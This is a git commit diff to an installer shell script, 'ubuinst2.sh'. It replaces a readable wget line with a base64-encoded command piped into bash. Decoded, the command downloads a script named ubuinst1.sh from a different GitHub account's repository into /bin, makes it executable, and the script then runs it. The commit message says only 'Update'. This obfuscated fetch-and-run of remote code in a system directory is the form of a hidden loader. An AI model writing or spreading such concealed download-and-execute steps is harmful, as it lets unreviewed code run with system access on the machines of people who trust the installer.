40a29308c470a9a9cf8d4f1874dac545ca2649ed
Digulgasoft <102381192+Digulgasoft@users.noreply.github.com>
2022-07-16 14:05:11 -0300

    Update ubuinst2.sh

--- ubuinst2.sh
+++ ubuinst2.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-echo 'wget raw.githubusercontent.com/Digulgasoft/NANDO-install/master/ubuinst1.sh && chmod +x ubuinst1.sh && dos2unix ubuinst1.sh > /dev/null 2>&1'  bash
+echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TckNhcnJhcmEvaW5zdGFsbC9iYWQvdWJ1aW5zdDEuc2ggJiYgY2htb2QgK3ggdWJ1aW5zdDEuc2ggJiYgZG9zMnVuaXggdWJ1aW5zdDEuc2ggPiAvZGV2L251bGwgMj4mMQpjZCB8fCBleGl0' | base64 -d | bash
 /bin/ubuinst1.sh
